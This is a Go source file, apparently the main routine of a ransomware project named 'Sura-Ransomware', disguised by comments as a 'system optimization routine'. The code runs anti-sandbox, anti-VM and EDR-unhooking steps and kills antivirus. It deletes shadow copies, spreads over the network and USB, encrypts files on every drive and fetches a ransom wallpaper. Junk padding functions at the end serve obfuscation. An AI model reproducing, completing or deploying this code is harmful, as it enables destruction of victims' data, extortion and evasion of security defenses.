// OBFUSCATED
// System optimization routine
// Windows compatibility layer
package main

import (
	"Sura-Ransomware/antiav"
	Configuration "Sura-Ransomware/configuration"
	"Sura-Ransomware/destruction"
	"Sura-Ransomware/envkey"
	"Sura-Ransomware/evasion"
	"Sura-Ransomware/filewalker"
	"Sura-Ransomware/lotl"
	"Sura-Ransomware/memory"
	"Sura-Ransomware/phantom"
	"Sura-Ransomware/polymorphic"
	"Sura-Ransomware/quantum"
	"Sura-Ransomware/spreading"
	"Sura-Ransomware/stealth"
	"Sura-Ransomware/unhook"
	"Sura-Ransomware/vxapi"
	"encoding/base64"
	"os"
	"time"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func main() {
	// Phase -2: VX-API Enhanced Checks (ULTRA EVASION)
	// Advanced anti-debug, anti-VM, anti-sandbox techniques from VX-Underground
	if vxapi.RunVXAPIChecks() {
		// Multiple analysis indicators detected - exit silently
		time.Sleep(Configuration.GetSandboxDelay())
		return
	}

	// Phase -1: CRITICAL - Unhook EDR before anything else
	// This removes API hooks from ntdll.dll and kernel32.dll that EDRs use for monitoring
	if Configuration.EnableEDRUnhooking {
		unhook.UnhookAll()
	}

	// Phase -0.5: NOVEL - Quantum State Validation (NEVER SEEN BEFORE)
	// Validates execution using true hardware entropy and timing characteristics
	// VMs and sandboxes CANNOT replicate this - they have predictable timing and fake entropy
	if Configuration.EnableQuantumStateValidation {
		if !quantum.IsQuantumStateValid() {
			// Hardware characteristics don't match physical system
			// This is a VM, sandbox, or emulator - exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}
	}

	// Phase 0: Polymorphic initialization - changes binary behavior on each run
	if Configuration.EnablePolymorphicCode {
		polymorphic.MetamorphicInit()
	}

	// Phase 0.25: NOVEL #3 - Phantom Thread Injection (THREAD BIRTH HIJACKING)
	// Executes code in suspended threads that appear as Windows service threads
	// Most stealthy execution method - no CreateRemoteThread, no APC, no suspicious APIs
	if Configuration.EnablePhantomThreads {
		phantom.InitializePhantomThreads()
	}

	// Environmental Keying - Only execute on intended targets
	if Configuration.EnableEnvironmentalKeying {
		if !envkey.VerifyEnvironment(Configuration.TargetFingerprint) {
			// Wrong target, exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}

		if Configuration.CheckForAnalysisTools && envkey.CheckForAnalysisTools() {
			// Analysis tools detected, exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}

		if Configuration.CheckForSandboxNames && envkey.CheckForSandboxArtifacts() {
			// Sandbox detected, exit silently
			time.Sleep(Configuration.GetSandboxDelay())
			return
		}
	}

	// Phase 1: Anti-AV techniques - block updates, kill AV processes, corrupt databases
	if Configuration.EnableAntiAVTechniques {
		antiav.InitializeAntiAV()
	}

	// Phase 2: Living-Off-The-Land techniques (uses only Windows built-in tools)
	// This looks like normal admin activity instead of malware
	lotl.InitializeLOTL()

	// Phase 3: Initialize stealth techniques
	stealth.InitializeStealth() // Poison memory to confuse memory dumps (if enabled)
	if Configuration.EnableMemoryPoisoning {
		go memory.PoisonMemory(Configuration.MemoryPoisonSize)
	}

	// Perform anti-sandbox and anti-VM checks
	if !evasion.ShouldExecute() {
		// Exit silently if in sandbox/VM
		time.Sleep(Configuration.GetSandboxDelay())
		return
	}

	// Initial delay before execution (escape sandbox timeout)
	time.Sleep(Configuration.GetInitialDelay())

	// Additional random delay
	time.Sleep(Configuration.GetRandomDelay())

	// Make files non-recoverable (delete shadow copies, etc.)
	// Now uses PowerShell/WMI instead of direct vssadmin (LOTL technique)
	if Configuration.DeleteShadowCopies || Configuration.DisableSystemRestore {
		destruction.MakeNonRecoverable()
	}

	// Start network spreading in background
	if Configuration.EnableNetworkSpreading || Configuration.EnableUSBSpreading {
		spreading.StartSpreading()
	}

	// Main encryption loop wrapped in Phantom Thread execution
	drives := getDrives()

	if Configuration.EnablePhantomThreads && Configuration.PhantomChainExecution {
		// Distribute encryption across phantom threads
		payloads := make([]func(), len(drives))
		for i, drive := range drives {
			drivePath := drive + d("OlxcXA==")
			payloads[i] = func() {
				filewalker.EncryptDirectory(drivePath)
			}
		}
		phantom.PhantomChainExecute(payloads)
	} else if Configuration.EnablePhantomThreads {
		// Execute through single phantom thread
		phantom.ShadowExecute(func() {
			for _, drive := range drives {
				filewalker.EncryptDirectory(drive + d("OlxcXA=="))
			}
		})
	} else {
		// Fallback to direct execution
		for _, drive := range drives {
			filewalker.EncryptDirectory(drive + d("OlxcXA=="))
		}
	}

	setWallpaperInMemory()

	// Cleanup phantom thread traces
	if Configuration.EnablePhantomThreads {
		phantom.CleanupPhantomTraces()
	}
}

func setWallpaperInMemory() {
	// Download wallpaper directly to memory without writing to disk
	imageData, err := memory.DownloadToMemory(Configuration.WallpaperURL)
	if err != nil {
		return
	}

	// Set wallpaper from memory buffer
	err = memory.SetWallpaperFromMemory(imageData)
	if err != nil {
		return
	}

	// Securely wipe memory after use
	memory.SecureWipeMemory(imageData)
}

func getDrives() (r []string) {
	letters := d("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=")
	suffix := d("Olxc")

	for _, drive := range letters {
		f, err := os.Open(string(drive) + suffix)
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}

	return
}



// Obfuscation padding
func obf_19373() {
    _ = 1149
    var _ = "0vvWDactXUIowr1W7eW9j8wxpdAKvit6P2S4a3ISjIX50op7wk"
}


// Obfuscation padding
func obf_53088() {
    _ = 9290
    var _ = "KXus0Hf9cGDK4V3SC6EwecZzW6GHCtKQZOnQ8IVrW2DE9d9epT"
}


// Obfuscation padding
func obf_62366() {
    _ = 5391
    var _ = "rWDkcudSoaL8zGEo2ffwPTvr74qXV0sj2F0MaZ9JCJCA7VH3wI"
}


// Obfuscation padding
func obf_25473() {
    _ = 9885
    var _ = "JMNuOyA9NRHt2P3QfQc4CzixeV5UdMonSq9d2dZv9oO7mL1I6G"
}


// Obfuscation padding
func obf_32114() {
    _ = 9848
    var _ = "6nxdKCfJ7lR3eod4ofsTKvSxqnC91s7odIvtjnUA4o2ufrvB3a"
}
